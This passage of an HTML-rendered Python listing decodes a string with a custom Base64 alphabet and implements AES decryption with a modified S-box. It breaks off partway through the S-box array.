class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><code class="hljs python">b64_str = <span class="hljs-string">&quot;l5FlaXCVBE2ALJgWLpekmm==&quot;</span><br>custom_b64_table = <span class="hljs-string">&quot;0123456789XYZabcdefghijklABCDEFGHIJKLMNOPQRSTUVWmnopqrstuvwxyz+/=&quot;</span><br><br><span class="hljs-comment"># æ„é€ åæŸ¥è¡¨</span><br>b64_rev_table = &#123;char: i <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(custom_b64_table)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base64_decode</span>(<span class="hljs-params">s</span>):<br>    s = s.rstrip(<span class="hljs-string">&#x27;=&#x27;</span>)<br>    buffer = <span class="hljs-number">0</span><br>    bits = <span class="hljs-number">0</span><br>    output = <span class="hljs-built_in">bytearray</span>()<br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> b64_rev_table:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Invalid character in Base64: <span class="hljs-subst">&#123;char&#125;</span>&quot;</span>)<br>        buffer = (buffer &lt;&lt; <span class="hljs-number">6</span>) + b64_rev_table[char]<br>        bits += <span class="hljs-number">6</span><br>        <span class="hljs-keyword">while</span> bits &gt;= <span class="hljs-number">8</span>:<br>            bits -= <span class="hljs-number">8</span><br>            output.append((buffer &gt;&gt; bits) &amp; <span class="hljs-number">0xFF</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(output)<br><br>cipher_bytes = custom_base64_decode(b64_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ” è§£ç åå¯†æ–‡ï¼ˆhexï¼‰ï¼š&quot;</span>, cipher_bytes.<span class="hljs-built_in">hex</span>().upper())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ” è§£ç åå¯†æ–‡ï¼ˆ16å­—èŠ‚ï¼‰ï¼š&quot;</span>, cipher_bytes.<span class="hljs-built_in">hex</span>().upper())<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-built_in">print</span>(raws)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>                <span class="hljs-keyword">for</span> temp1, Rcon1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(temp, Rcon[(i // self.Nk) - <span class="hljs-number">1</span>]):<br>                    temp2.append(temp1 ^ Rcon1)<br>                temp = temp2<br>            <span class="hljs-keyword">elif</span> self.Nk &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> i % self.Nk == <span class="hljs-number">4</span>:<br>                temp = self.SubWord(temp)<br>            w_temp = []<br>            <span class="hljs-keyword">for</span> w1, temp1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(w[i - self.Nk], temp):<br>                w_temp.append(w1 ^ temp1)<br>            w[i] = w_temp<br>            i = i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> w<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">IAES</span>(<span class="hljs-params">self, IInput, Cipher_Key,inv_s_box</span>):<br>        IInput = [IInput1 <span class="hljs-keyword">for</span> IInput1 <span class="hljs-keyword">in</span> IInput]<br>        Cipher_Key = [Cipher_Key1 <span class="hljs-keyword">for</span> Cipher_Key1 <span class="hljs-keyword">in</span> Cipher_Key]<br>        KeyExpansion = self.KeyExpansion(Cipher_Key)<br>        keys = []<br>        <span class="hljs-keyword">for</span> Key_index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(KeyExpansion) // <span class="hljs-number">4</span>):<br>            keys_temp = (KeyExpansion[<span class="hljs-number">4</span> * Key_index] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">1</span>] + KeyExpansion[<br>                <span class="hljs-number">4</span> * Key_index + <span class="hljs-number">2</span>] + KeyExpansion[<span class="hljs-number">4</span> * Key_index + <span class="hljs-number">3</span>])<br>            keys_temp = self.arrays(keys_temp)<br>            keys.append(keys_temp)<br>        IInput = self.arrays(IInput)<br>        self.view(IInput)<br>        self.view(keys[-<span class="hljs-number">1</span>])<br>        IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span>])<br>        self.view(IInput)<br>        <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.Nr - <span class="hljs-number">1</span>):<br>            IInput = self.InvShiftRows(IInput)<br>            self.view(IInput)<br>            IInput = self.InvSubBytes(IInput,inv_s_box)<br>            self.view(IInput)<br>            self.view(keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            IInput = self.AddRoundKey(IInput, keys[-<span class="hljs-number">1</span> - <span class="hljs-number">1</span> - index])<br>            self.view(IInput)<br>            IInput = self.InvMixColumns(IInput)<br>            self.view(IInput)<br>        IInput = self.InvShiftRows(IInput)<br>        self.view(IInput)<br>        IInput = self.InvSubBytes(IInput,inv_s_box)<br>        self.view(IInput)<br>        self.view(keys[<span class="hljs-number">0</span>])<br>        IInput = self.AddRoundKey(IInput, keys[<span class="hljs-number">0</span>])<br>        self.view(IInput)<br>        IInput = self.Inv_arrays(IInput)<br>        IInput = <span class="hljs-built_in">bytes</span>(IInput)<br>        <span class="hljs-keyword">return</span> IInput<br><br>new_s_box = [<span class="hljs-number">0x31</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x83</span>,<br>             <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x7B</span>,<br>             <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x67</span>,<br>             <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x74</span>,<br>             <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xB0</span>,<br>             <span class="hljs-number">0x04</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x45</span>,<br>             <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x20</span>,<br>             <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x16</span>,<br>             <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>,<br>             <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x3E</span>,<br>             <span class="hljs-number">0x40</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD2</span>,<br>             <span class="hljs-number">0x96</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xBF</span>,<br>             <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8A</span>,<br>             <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xBE</span>,<br>             <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x99</span>,<br>             <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x7D</span>, <span 